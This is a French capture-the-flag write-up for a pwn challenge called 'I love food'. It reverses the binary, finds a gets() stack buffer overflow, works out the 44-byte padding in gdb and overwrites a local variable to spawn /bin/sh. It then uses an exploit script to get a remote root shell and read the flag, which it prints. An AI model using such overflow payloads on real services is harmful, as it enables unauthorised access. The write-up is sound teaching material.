# I love food !

Sujet :

```md
I made a program to know more about the tastes of the players, what's your favorite food ? :)

http://internetcest.fun:13338
```

[Cet exécutable](./i_love_food) est fournis. Essayons le :

```bash
$ ./i_love_food 
What is your favorite dish ? 
test
Interesting... Mine is DEADBEEF :) 
```

Le programme demande une entrée de l'utilisateur, et s'arrête. Explorons le code.

## Reverse

Avec ghidra on obtient le code suivant :

```C
undefined8 main(void)
{
  setup();
  vuln();
  return 0;
}

void vuln(void)
{
  char local_38 [44];
  uint local_c;
  
  local_c = 0xdeadbeef;
  puts("What is your favorite dish ? ");
  gets(local_38);
  if (local_c == 0xf00df00d) {
    puts("Damn that\'s a good one !");
    system("/bin/sh");
  }
  else {
    printf("Interesting... Mine is %X :)",(ulong)local_c);
  }
  return;
}
```

On veut exécuter la commande `system("/bin/sh");` dans la fonction vuln() pour obtenir un shell. Il faut donc valider la condition `if (local_c == 0xf00df00d)`.  
  
La fonction gets() utilisé pour récupérer l'entrée de l'utilisateur étant vulnérable à un buffer overflow, on comprend qu'il faut utiliser cette faille pour modifier la variable local_c.

## Payload

Utilisons gdb pour trouver notre payload :

```gdb
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0000000000001194 <+0>:	push   %rbp
   0x0000000000001195 <+1>:	mov    %rsp,%rbp
   0x0000000000001198 <+4>:	sub    $0x30,%rsp
   0x000000000000119c <+8>:	movl   $0xdeadbeef,-0x4(%rbp)
   0x00000000000011a3 <+15>:	lea    0xe5a(%rip),%rax        # 0x2004
   0x00000000000011aa <+22>:	mov    %rax,%rdi
   0x00000000000011ad <+25>:	call   0x1030 <puts@plt>
   0x00000000000011b2 <+30>:	lea    -0x30(%rbp),%rax
   0x00000000000011b6 <+34>:	mov    %rax,%rdi
   0x00000000000011b9 <+37>:	mov    $0x0,%eax
   0x00000000000011be <+42>:	call   0x1070 <gets@plt>
   0x00000000000011c3 <+47>:	cmpl   $0xf00df00d,-0x4(%rbp)
   0x00000000000011ca <+54>:	jne    0x11ec <vuln+88>
   0x00000000000011cc <+56>:	lea    0xe4f(%rip),%rax        # 0x2022
   0x00000000000011d3 <+63>:	mov    %rax,%rdi
   0x00000000000011d6 <+66>:	call   0x1030 <puts@plt>
   0x00000000000011db <+71>:	lea    0xe59(%rip),%rax        # 0x203b
   0x00000000000011e2 <+78>:	mov    %rax,%rdi
   0x00000000000011e5 <+81>:	call   0x1050 <system@plt>
   0x00000000000011ea <+86>:	jmp    0x1205 <vuln+113>
   0x00000000000011ec <+88>:	mov    -0x4(%rbp),%eax
   0x00000000000011ef <+91>:	mov    %eax,%esi
   0x00000000000011f1 <+93>:	lea    0xe4b(%rip),%rax        # 0x2043
   0x00000000000011f8 <+100>:	mov    %rax,%rdi
   0x00000000000011fb <+103>:	mov    $0x0,%eax
   0x0000000000001200 <+108>:	call   0x1060 <printf@plt>
   0x0000000000001205 <+113>:	nop
   0x0000000000001206 <+114>:	leave
   0x0000000000001207 <+115>:	ret
End of assembler dump.
(gdb) break *vuln+47
Breakpoint 1 at 0x11c3
(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44)')
Starting program: /home/coucou/Documents/I_love_food/i_love_food <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
What is your favorite dish ? 

Breakpoint 1, 0x00005555555551c3 in vuln ()
(gdb) x/20wx $rsp
0x7fffffffda20:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda30:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda40:	0x41414141	0x41414141	0x41414141	0xdeadbe00
0x7fffffffda50:	0xffffda70	0x00007fff	0x5555522b	0x00005555
0x7fffffffda60:	0xffffdb88	0x00007fff	0x00000000	0x00000001
```

On lance gdb, ajoute un break après l'appel de la fonction gets, et rentre 44 charactères A pour remplir le buffer utilisé pour stocker l'entrée de l'utilisateur. En observant la stack on voit que la variable local_c contenant `deadbeef` est stocké directement après. Essayons de la modifier :

```gdb
(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")')
Starting program: /home/coucou/Documents/I_love_food/i_love_food <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
What is your favorite dish ? 

Breakpoint 1, 0x00005555555551c3 in vuln ()
(gdb) x/20wx $rsp
0x7fffffffda20:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda30:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda40:	0x41414141	0x41414141	0x41414141	0xf00df00d
0x7fffffffda50:	0xffffda00	0x00007fff	0x5555522b	0x00005555
0x7fffffffda60:	0xffffdb88	0x00007fff	0x00000000	0x00000001
(gdb) c
Continuing.
Damn that's a good one !
[Detaching after vfork from child process 4655]

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
```

On arrive bien au message de succès. Testons le payload directement sur l'executable :

```bash
$ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")' ; tee) | ./i_love_food  
What is your favorite dish ? 

Damn that's a good one !
whoami
coucou
ls
exploit.py  i_love_food  README.md
```

Le programme lance bien /bin/sh, le payload final est donc `"\x41"*44+"\x0d\xf0\x0d\xf0"`.

## Exploit

Il faut maintenant se connecter au service et envoyer le payload. On utilise donc [ce script python](./exploit.py) qui permet de ce connecter au serveur, envoyer le payload, puis d'interagir avec le shell pour obtenir le flag :

```bash
$ python3 exploit.py                                                                              
b"What is your favorite dish ? \nDamn that's a good one !\n"
whoami
b'root\n'
ls
b'flag.txt\ni_love_food\ni_love_food.c\n'
cat flag.txt
b'FLAG{I_JU5T_L1K3_F00D!!}\n'
```
